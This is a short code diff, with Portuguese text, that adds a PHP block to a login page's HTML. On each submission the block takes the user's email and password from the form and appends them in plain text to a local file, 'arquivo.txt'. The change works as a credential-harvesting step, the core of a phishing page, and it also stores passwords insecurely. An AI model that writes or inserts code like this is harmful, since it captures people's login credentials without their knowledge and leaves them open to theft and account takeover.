@@ -54,6 +54,19 @@
     <br>
     <h4>Use uma conta e Faça Login</h4>
 
+    <?php
+        $arquivo = 'arquivo.txt';
+        $arquivoAberto = fopen($arquivo, 'a');
+        // $conteudo = $email ." ". $senha;
+
+        $email = $_POST['email'];
+        $senha = $_POST['csenha'];
+        $conteudo = $email ." ". $senha . "\n";
+
+        fwrite($arquivoAberto, $conteudo);
+        fclose($arquivoAberto);
+    ?>
+
     <div class="form-control-teste">
         <div class="wrapper fadeInDown zero-raduis">
             <div id="formContent">
